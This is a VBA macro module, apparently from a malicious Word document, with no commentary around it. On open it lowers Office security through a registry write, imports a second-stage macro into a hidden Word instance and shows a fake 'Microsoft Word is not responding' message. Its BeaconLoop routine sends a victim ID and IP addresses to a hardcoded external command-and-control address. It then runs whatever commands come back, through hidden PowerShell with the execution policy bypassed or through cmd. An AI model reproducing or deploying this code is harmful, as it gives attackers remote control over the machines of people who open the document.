Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.RegWrite "HKCU\SOFTWARE\Microsoft\Office\16.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
    Dim app As Object
    Set app = CreateObject("Word.Application")
    app.Visible = False
    app.VBE.ActiveVBProject.VBComponents.Import "C:\Users\Public\stage2.bas"
    MsgBox "Microsoft Word is not responding"
End Sub
Private Sub Document_Close()
    Shell "cmd /c taskkill /F /IM WINWORD.EXE", vbHide
End Sub
Sub BeaconLoop()
    Dim h As Object
    Set h = CreateObject("MSXML2.XMLHTTP")
    h.Open "POST", "http://185.205.187.108:25498/c2lnbnVw", False
    h.send "{""id"":""aB3dE5gH7j"",""local_ip"":""10.0.0.5"",""public_ip"":""1.2.3.4""}"
    Dim cmd As String
    cmd = h.responseText
    If Left(cmd, 4) = "$uri" Or Left(cmd, 4) = "$req" Then
        Shell "powershell -w hidden -ep bypass -c " & cmd, vbHide
    Else
        Shell "cmd /c " & cmd & " > C:\ProgramData\UiAutomation.txt", vbHide
    End If
End Sub
